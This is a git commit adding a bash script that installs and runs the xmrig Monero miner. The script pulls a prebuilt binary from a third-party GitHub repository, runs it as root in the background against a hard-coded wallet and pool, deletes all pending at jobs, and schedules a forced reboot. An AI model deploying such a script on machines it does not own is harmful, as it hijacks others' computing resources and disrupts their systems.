00172dca157164d2d3583da7080b13af801f99df
Loaman1 <44247195+Loaman1@users.noreply.github.com>
2018-11-20 16:34:38 +0300

    Create hashvault.sh
    monero.hashvault.pro

---
+++ hashvault.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+
+WALLET=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
+ID="$(hostname)"
+MAIL=robbertopp@gmail.com
+PASSWORD=$ID
+THREADS="$(nproc --all)"
+POOL=pool.monero.hashvault.pro:3333
+rm -rf /tmp/miner/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir miner
+git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
+cd /tmp/miner
+chmod +x /tmp/miner/xmrig
+cp /tmp/miner/xmrig /usr/bin/
+sleep 1
+xmrig -o $POOL -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --background
+echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
+
+touch /tmp/at.txt
+echo 'sudo reboot -f' >> /tmp/at.txt
+at now + 24 hours < /tmp/at.txt
+echo -e 'Restart job specified'
